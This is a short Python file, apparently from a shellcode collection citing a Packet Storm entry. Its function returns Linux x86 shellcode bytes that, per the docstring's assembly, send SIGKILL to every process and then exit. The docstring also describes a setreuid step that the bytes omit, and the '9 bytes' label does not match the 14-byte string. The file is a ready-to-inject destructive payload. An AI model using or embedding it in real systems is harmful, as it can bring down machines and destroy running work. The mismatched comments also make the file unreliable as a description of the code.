#https://packetstormsecurity.com/files/85131/Linux-x86-9-Bytes-Kill-All-Processes-Shellcode.html
#http://www.linfo.org/killall.html
#; linux/x86 kill all processes 9 bytes
#; root@thegibson
#; 2010-01-14


def killall():
	"""
	push byte +0x46  	; push 70 = setreuid()
	pop eax   			; pop 70 into eax
	int 0x80  			; eax = setreuid(0, 0), on success 0 is returned

	mov al, 37
	push byte -1
	pop ebx
	mov cl, 9
	int 0x80


	31 c0   xor    eax,eax
	40 		inc    eax
	cd 80 	int    $0x80

	"""
	shellcode  =   r'\xb0\x25\x6a\xff\x5b' 
	shellcode +=   r'\xb1\x09\xcd\x80\x31'
	shellcode +=   r'\xc0\x40\xcd\x80' 
	return shellcode

#WORK

#https://packetstormsecurity.com/files/85131/Linux-x86-9-Bytes-Kill-All-Processes-Shellcode.html
#http://www.linfo.org/killall.html